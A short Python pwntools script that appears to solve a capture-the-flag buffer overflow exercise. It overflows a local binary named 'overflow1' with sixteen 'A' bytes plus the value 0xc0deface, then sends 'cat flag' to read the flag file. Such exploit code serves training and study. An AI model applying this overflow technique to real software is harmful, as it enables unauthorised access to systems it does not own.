from pwn import *
p = process(['overflow1','A'*16+pack(0xc0deface)])
#p.interactive()
p.sendline('cat flag\n')

